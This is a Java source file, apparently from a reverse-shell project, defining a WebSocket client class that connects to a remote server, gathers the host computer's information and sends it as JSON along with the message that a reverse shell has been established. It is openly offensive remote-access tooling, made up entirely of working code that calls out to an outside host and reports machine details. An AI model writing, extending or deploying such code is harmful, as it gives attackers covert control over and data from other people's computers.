package com.mtattab.reverseshell.service.impl;

import com.mtattab.reverseshell.model.ServerRestCommunicationModel;
import com.mtattab.reverseshell.service.WebsocketReverseShellService;
import com.mtattab.reverseshell.util.DataManipulationUtil;
import com.mtattab.reverseshell.util.OSUtil;
import lombok.Getter;
import lombok.Setter;
import org.eclipse.jetty.websocket.api.Session;
import org.eclipse.jetty.websocket.api.WebSocketAdapter;


import java.io.IOException;
import java.net.URI;
@Getter
@Setter
public class WebsocketReverseShellServiceImpl extends WebSocketAdapter implements WebsocketReverseShellService {

    private Session session;


    @Override
    public void onWebSocketText(String message) {
        System.out.println("[+] Received message: " + message);
    }
    @Override
    public void onWebSocketConnect(Session session){
        this.session= session;
        try {
            ServerRestCommunicationModel intialCommunactionMessage=  OSUtil.getComputerInfo();
            intialCommunactionMessage.setReply("[+] ReverseShell has been established");

            session.getRemote()
                    .sendString(
                            DataManipulationUtil.convertObjToJson(intialCommunactionMessage)
            );
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }







}
